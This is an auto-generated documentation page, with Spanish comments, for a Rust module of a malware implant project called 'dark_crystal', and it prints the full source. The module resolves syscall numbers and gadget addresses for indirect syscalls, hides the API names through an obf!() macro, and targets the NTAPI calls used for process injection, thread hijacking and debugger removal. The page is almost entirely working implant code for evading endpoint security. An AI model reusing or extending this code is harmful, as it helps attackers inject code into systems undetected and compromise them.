# sysindirect_map

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/sysindirect_map.rs` |
| **Lines** | 66 |
| **Cards** | T004-syscall-dispatch |
| **Role** | Syscall SSN+gadget map |

## Public API

### `syscall_map` (line 8)
```rust
pub fn syscall_map() -> &'static HashMap<u32, (u32, usize)>
```
Colección estática: (Hash) -> (System Service Number, Gadget Return Address)

Este mapa es la FUENTE ÚNICA DE VERDAD para todas las syscalls del implante.
Se inicializa UNA VEZ (OnceLock) y llama EXCLUSIVAMENTE a sys_resolve.

### `get_ssn_and_gadget` (line 54)
```rust
pub fn get_ssn_and_gadget(hash: u32) -> Option<(u32, usize)>
```
Obtiene el SSN y el gadget address para una syscall por su hash.
Devuelve None si el hash no está en el mapa.

### `get_ssn` (line 59)
```rust
pub fn get_ssn(hash: u32) -> Option<u32>
```
Obtiene solo el SSN (para compatibilidad con código que solo necesita el número).

### `get_gadget` (line 64)
```rust
pub fn get_gadget(hash: u32) -> Option<usize>
```
Obtiene solo el gadget address (para RecycledGate).

## Full Source

```rust
use std::collections::HashMap;
use std::sync::OnceLock;

/// Colección estática: (Hash) -> (System Service Number, Gadget Return Address)
///
/// Este mapa es la FUENTE ÚNICA DE VERDAD para todas las syscalls del implante.
/// Se inicializa UNA VEZ (OnceLock) y llama EXCLUSIVAMENTE a sys_resolve.
pub fn syscall_map() -> &'static HashMap<u32, (u32, usize)> {
    static MAP: OnceLock<HashMap<u32, (u32, usize)>> = OnceLock::new();
    MAP.get_or_init(|| {
        let mut m = HashMap::new();
        // Lista de nombres de funciones NTAPI necesarias para el implante.
        // NOTA: En producción, estos nombres DEBEN ser procesados por obf!()
        // para no exponerlos como strings en .rdata.
        // Sin embargo, para la inicialización del mapa, los strings se usan
        // en compile-time para calcular hashes, y luego se descartan.
        let api_names = vec![
            crate::obf!("NtAllocateVirtualMemory"),
            crate::obf!("NtAllocateVirtualMemoryEx"),
            crate::obf!("NtWriteVirtualMemory"),
            crate::obf!("NtReadVirtualMemory"),
            crate::obf!("NtProtectVirtualMemory"),
            crate::obf!("NtCreateThreadEx"),
            crate::obf!("NtCreateSection"),
            crate::obf!("NtMapViewOfSection"),
            crate::obf!("NtUnmapViewOfSection"),
            crate::obf!("NtQueueApcThread"),
            crate::obf!("NtOpenProcess"),
            crate::obf!("NtQueryInformationProcess"),
            crate::obf!("NtRemoveProcessDebug"),
            crate::obf!("NtTerminateProcess"),
            crate::obf!("NtClose"),
            crate::obf!("NtCreateProcessEx"),
            crate::obf!("NtResumeThread"),
            crate::obf!("NtDelayExecution"),
            crate::obf!("NtSetContextThread"),
            crate::obf!("NtGetContextThread"),
            crate::obf!("NtSuspendThread"),
        ];

        for name in &api_names {
            let hash = crate::compute_hash(name);
            let (ssn, gadget) = crate::sys_resolve::resolve_ssn(name);
            if ssn != 0 && gadget != 0 {
                m.insert(hash, (ssn, gadget));
            }
        }
        m
    })
}

/// Obtiene el SSN y el gadget address para una syscall por su hash.
/// Devuelve None si el hash no está en el mapa.
pub fn get_ssn_and_gadget(hash: u32) -> Option<(u32, usize)> {
    syscall_map().get(&hash).copied()
}

/// Obtiene solo el SSN (para compatibilidad con código que solo necesita el número).
pub fn get_ssn(hash: u32) -> Option<u32> {
    syscall_map().get(&hash).map(|(ssn, _)| *ssn)
}

/// Obtiene solo el gadget address (para RecycledGate).
pub fn get_gadget(hash: u32) -> Option<usize> {
    syscall_map().get(&hash).map(|(_, gadget)| *gadget)
}

```